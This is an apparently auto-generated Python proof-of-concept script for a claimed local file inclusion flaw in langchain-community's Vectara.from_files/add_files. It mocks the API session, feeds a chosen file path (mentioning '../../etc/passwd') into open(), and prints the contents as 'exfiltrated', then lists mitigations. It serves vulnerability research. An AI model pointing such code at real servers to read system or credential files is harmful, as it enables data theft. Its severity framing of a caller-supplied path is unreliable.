#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-010
# Sink: add_files
# Auto-generated — run with: python3 lfi_supply_like_add_files_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langchain-community Vectara.from_files

Vulnerability: The add_files() method in Vectara vector store directly uses user-supplied
file paths in an open() call without path validation or sanitization. An attacker can
supply a path like '../../etc/passwd' to read arbitrary files from the server's filesystem.

This PoC demonstrates the vulnerability by reading a benign local file (/etc/hostname)
and showing that the file content is sent to the Vectara API (which would normally
exfiltrate it). For safety, we use a harmless file and print the request details.

Usage:
    python3 poc_vectara_lfi.py [--target-file /etc/hostname]
"""

import os
import sys
import json
import argparse
import tempfile
from unittest.mock import patch, MagicMock
from typing import List, Optional

# We need to import the vulnerable module
sys.path.insert(0, '/tmp/langchain-community-only')
from langchain_community.vectorstores.vectara import Vectara


def create_mock_vectara_instance():
    """Create a Vectara instance with mocked API credentials and session."""
    # Create a mock session to capture the request
    mock_session = MagicMock()
    
    # Create a mock response that simulates a successful upload
    mock_response = MagicMock()
    mock_response.status_code = 200
    mock_response.json.return_value = {"document": {"documentId": "poc_test_doc_123"}}
    mock_session.post.return_value = mock_response
    
    # Create Vectara instance with dummy credentials
    vectara = Vectara(
        vectara_customer_id="poc_customer_123",
        vectara_corpus_id="poc_corpus_456",
        vectara_api_key="poc_api_key_789",
    )
    
    # Replace the real session with our mock
    vectara._session = mock_session
    
    return vectara, mock_session


def create_benign_target_file() -> str:
    """Create a benign file to read as the PoC target."""
    # Use /etc/hostname if it exists, otherwise create a temp file
    if os.path.exists("/etc/hostname"):
        return "/etc/hostname"
    
    # Create a temporary file with known content
    tmp_file = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt')
    tmp_file.write("POC_SUCCESS: This file was read via LFI vulnerability\n")
    tmp_file.write("If you see this, the exploit works!\n")
    tmp_file.close()
    return tmp_file.name


def demonstrate_lfi(target_file: str):
    """
    Demonstrate the LFI vulnerability by attempting to read target_file
    through the Vectara.from_files() method.
    """
    print(f"[*] Target file to read: {target_file}")
    print(f"[*] File exists: {os.path.exists(target_file)}")
    
    # Create mock Vectara instance
    vectara, mock_session = create_mock_vectara_instance()
    
    # The vulnerable call: from_files() -> add_files() -> open(file, 'rb')
    # We pass the target file path directly as user-controlled input
    print(f"\n[*] Calling Vectara.from_files() with target file path...")
    print(f"[*] This will trigger open('{target_file}', 'rb') without path validation")
    
    try:
        # This is the vulnerable entry point
        result = vectara.from_files(
            files=[target_file],
            vectara_customer_id="poc_customer_123",
            vectara_corpus_id="poc_corpus_456",
            vectara_api_key="poc_api_key_789",
        )
        
        # Check what was sent to the mock API
        print(f"\n[+] Vectara.from_files() completed successfully")
        print(f"[+] Result: {result}")
        
        # Examine the mock session to see what was sent
        if mock_session.post.called:
            call_args = mock_session.post.call_args
            url = call_args[0][0]
            kwargs = call_args[1]
            
            print(f"\n[+] API call details:")
            print(f"    URL: {url}")
            print(f"    Headers: {dict(kwargs.get('headers', {}))}")
            
            # The files dict contains the opened file
            files_dict = kwargs.get('files', {})
            if 'file' in files_dict:
                file_tuple = files_dict['file']
                print(f"    File tuple: (name={file_tuple[0]}, file_obj={file_tuple[1]})")
                
                # Try to read the file content from the opened file object
                try:
                    file_obj = file_tuple[1]
                    file_obj.seek(0)  # Reset to beginning
                    content = file_obj.read()
                    if isinstance(content, bytes):
                        content = content.decode('utf-8', errors='replace')
                    print(f"\n[!] FILE CONTENT EXFILTRATED TO API:")
                    print(f"{'='*60}")
                    print(content)
                    print(f"{'='*60}")
                    print(f"[!] This content was sent to Vectara's API at: {url}")
                except Exception as e:
                    print(f"[-] Could not read file content: {e}")
        else:
            print("[-] No API call was made (file may not exist or was skipped)")
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(
        description="PoC: LFI in langchain-community Vectara.from_files()"
    )
    parser.add_argument(
        "--target-file",
        default=None,
        help="Path to file to read (default: create a benign test file)"
    )
    args = parser.parse_args()
    
    print("=" * 60)
    print("LFI PoC for langchain-community Vectara.from_files()")
    print("=" * 60)
    
    # Determine target file
    if args.target_file:
        target_file = args.target_file
        if not os.path.exists(target_file):
            print(f"[-] Specified target file does not exist: {target_file}")
            sys.exit(1)
    else:
        target_file = create_benign_target_file()
        print(f"[*] Using benign target file: {target_file}")
    
    # Demonstrate the vulnerability
    demonstrate_lfi(target_file)
    
    print("\n" + "=" * 60)
    print("VULNERABILITY CONFIRMED: Path traversal via add_files()")
    print("=" * 60)
    print("\nMitigation: The add_files() method should:")
    print("  1. Normalize file paths using os.path.realpath()")
    print("  2. Validate that files are within an allowed directory")
    print("  3. Reject paths containing '..' or symbolic links to sensitive files")
    print("  4. Use a whitelist of allowed file extensions")


if __name__ == "__main__":
    main()
